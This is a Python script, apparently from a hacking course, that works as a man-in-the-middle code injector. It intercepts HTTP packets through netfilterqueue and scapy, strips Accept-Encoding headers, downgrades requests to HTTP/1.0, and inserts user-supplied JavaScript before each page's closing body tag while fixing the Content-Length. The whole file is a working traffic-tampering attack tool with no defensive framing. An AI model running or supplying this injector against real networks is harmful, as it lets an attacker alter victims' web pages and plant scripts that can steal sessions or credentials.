#!/usr/bin/env python

import argparse
import re
import netfilterqueue
import scapy.all as scapy

'''
    To run the script follow the example below:
    
    python script_name.py --code '<script>alert("test");</script>'        
'''


def get_args():
    """
    Parse and return command line arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--code", dest="injection_code",
                        help="Injection code", required=True)
    args = parser.parse_args()
    return args


def set_load(packet, load):
    """
    Set payload and recalculate the necessary fields.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet, injection_code):
    """
    Analyze and manipulate packets.
    """
    scapy_packet = scapy.IP(packet.get_payload())
    select_port = 8080

    if scapy_packet.haslayer(scapy.Raw):
        load = str(scapy_packet[scapy.Raw].load)

        if scapy_packet[scapy.TCP].dport == select_port:
            load = re.sub('Accept-Encoding:.*?\\\\r\\\\n', '', load)
            load = load.replace('HTTP/1.1', 'HTTP/1.0')

        elif scapy_packet[scapy.TCP].sport == select_port:
            if '</body>' in load:
                load = load.replace('</body>', injection_code + '</body>')
                content_length_search = re.search(
                    '(?:Content-Length:\\s)(\\d*)', load)

                if content_length_search and 'text/html' in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(
                        content_length) + len(injection_code)
                    load = load.replace(
                        content_length, str(new_content_length))

        if load != str(scapy_packet[scapy.Raw].load):
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


def main():
    """
    Main function to run the script logic.
    """
    options = get_args()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(
        packet, options.injection_code))
    queue.run()


if __name__ == "__main__":
    main()
